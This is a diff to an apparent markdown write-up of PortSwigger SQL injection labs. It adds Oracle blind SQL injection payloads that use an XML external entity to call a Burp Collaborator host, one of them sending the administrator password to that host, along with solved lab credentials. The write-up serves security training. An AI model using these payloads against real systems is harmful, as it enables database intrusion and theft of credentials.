@@ -395,3 +395,31 @@ Password: 3ewy9yfdfg7vfqjlv1oy
 [Link](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
 
 
+```
+TrackingId=<Your TrackingId>'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//<Your BurpSuite Collaborator Server>/">+%25remote%3B]>'),'/l')+FROM+dual)--
+```
+![](imgs/2023-10-10-10-24-26.png)
+
+Open tab Collaborator (Pro only):
+![](imgs/2023-10-10-10-24-56.png)
+
+![](imgs/2023-10-10-10-25-58.png)
+
+### Lab 17: Blind SQL injection with out-of-band data exfiltration
+[Link](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+```
+TrackingId=<Your TrackingId>'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<Your BurpSuite Collaborator Server>/">+%25remote%3B]>'),'/l')+FROM+dual)--
+```
+![](imgs/2023-10-10-10-59-25.png)
+
+```
+Username: administrator
+Password: uk7az7u3limbj95dg50b
+```
+
+![](imgs/2023-10-10-11-00-16.png)
+
+### Lab 18: SQL injection with filter bypass via XML encoding
+[Link](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+
